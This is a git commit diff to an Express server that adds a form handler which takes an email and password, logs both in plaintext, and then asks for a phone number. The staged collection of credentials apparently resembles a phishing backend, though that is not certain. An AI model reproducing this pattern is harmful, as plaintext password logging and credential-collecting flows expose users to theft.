1166485a5585e449a7395b1dba6e0578fadd7f2c
NightSonar <SparrowSC@protonmail.com>
2025-08-23 20:45:22 +0100

    server.js

--- server.js
+++ server.js
@@ -14,6 +14,18 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));  // Make sure index.html is in the root folder
 });
 
+// Handle email and password submission
+app.post('/submit-form', (req, res) => {
+    const { email, password } = req.body;
+
+    // Log the form data (this is where you could store it in a database)
+    console.log(`Email: ${email}, Password: ${password}`);
+
+    // Send a response to the user
+    res.send('Email and password submitted successfully! Now enter your phone number.');
+});
+
+// Handle phone number submission
 app.post('/submit-phone', (req, res) => {
     const { email, password, phone } = req.body;
 
@@ -23,7 +35,6 @@ app.post('/submit-phone', (req, res) => {
     // Send a response to the user
     res.send('Phone number submitted successfully!');
 });
-
 
 // Start the server
 app.listen(PORT, () => {
